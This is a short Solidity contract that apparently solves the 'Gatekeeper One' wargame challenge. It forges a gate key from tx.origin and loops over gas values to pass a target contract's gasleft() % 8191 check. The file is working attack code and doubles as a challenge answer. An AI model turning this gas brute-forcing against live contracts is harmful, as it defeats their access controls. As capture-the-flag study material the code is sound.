// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    function attack(address _targetContractAddress) public returns (bool) {
        address payable targetContract = payable(_targetContractAddress);
        bytes8 gateKey;
        uint256 gasToUse = 8191 * 10;
        bool result;

        gateKey = bytes8((uint64(0x1) << 32) | uint16(uint160(tx.origin)));

        // function enter(bytes8 _gateKey)
        bytes memory payload = abi.encodeWithSignature(
            "enter(bytes8)",
            gateKey
        );

        //  try different gas values iteratively to find one that satisfies gasleft() % 8191 == 0
        for (uint256 i = 0; i < 8191; i++) {
            (result, ) = targetContract.call{gas: gasToUse + i}(payload);
            if (result) break;
        }

        return result;
    }
}
